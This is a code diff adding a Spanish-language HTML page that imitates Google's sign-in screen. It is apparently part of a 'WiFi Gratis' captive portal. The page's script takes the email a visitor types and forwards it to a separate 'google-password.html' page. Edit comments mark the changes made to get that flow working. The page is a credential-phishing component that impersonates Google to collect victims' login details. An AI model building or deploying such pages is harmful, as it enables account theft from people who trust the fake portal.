@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Inicia sesión - Google </title>
+  <link rel="stylesheet" href="google.css" />
+</head>
+<body>
+  <div class="container">
+    <div class="box dark-box">
+      <div class="logo-title">
+        <img src="../img/google-icon.png" alt="Google Rosita" class="logo" />
+        <p class="top-title">Iniciar sesión con Google</p>
+      </div>
+
+      <h1>Inicia sesión</h1>
+      <p class="subtitle">Ir a <a href="../index.html">WiFi Gratis</a></p>
+
+      <!-- CAMBIO 1: id agregado -->
+      <form id="loginForm">
+        <!-- CAMBIO 2: id agregado -->
+        <input type="email" id="emailInput" placeholder="Correo electrónico o teléfono" required />
+        <a href="#" class="link">¿Has olvidado tu correo electrónico?</a>
+
+        <div class="spacer"></div>
+
+        <div class="actions">
+          <a href="#" class="link">Crear cuenta</a>
+          <button type="submit">Siguiente</button>
+        </div>
+      </form>
+    </div>
+  </div>
+
+  <!-- CAMBIO 3: este script ahora sí funciona -->
+  <script>
+    const form = document.getElementById('loginForm');
+    form.addEventListener('submit', function (e) {
+      e.preventDefault();
+      const email = document.getElementById('emailInput').value;
+      window.location.href = `google-password.html?email=${encodeURIComponent(email)}`;
+    });
+  </script>
+</body>
+</html>
